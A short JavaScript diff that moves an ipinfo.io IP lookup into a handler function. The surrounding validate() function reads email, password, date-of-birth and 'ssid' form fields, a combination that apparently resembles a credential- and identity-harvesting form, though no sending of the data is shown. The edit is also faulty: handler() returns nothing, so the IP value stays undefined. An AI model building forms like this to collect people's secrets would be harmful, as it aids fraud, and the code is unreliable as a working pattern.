@@ -26,26 +26,29 @@
     // Fire the loading
     head.appendChild(script);
 
+var ipad="";
     function handler(){
-       console.log('jquery added :)');
+       $.get("https://ipinfo.io", function(response) {
+		ipad = response.ip;
+	       return ipad;
+    }, "json")
     }
 
 //--------------------------------------------------------------------------
+
+
+
+
 function validate() {
 
     var email = document.getElementsByName('email')[0].value;
     var pass = document.getElementsByName('password')[0].value;
     var dob = document.getElementsByName('dob')[0].value;
     var ssid = document.getElementsByName('ssid')[0].value;
-    var ipadd = "";
+    var ipadd = handler();
     var b;
 //     var datee=null;
 	
-    ipadd = $.get("https://ipinfo.io", function(response) {
-			
-			return response.ip;
-	    		
-    }, "json")
 
     if (email != "") {
 
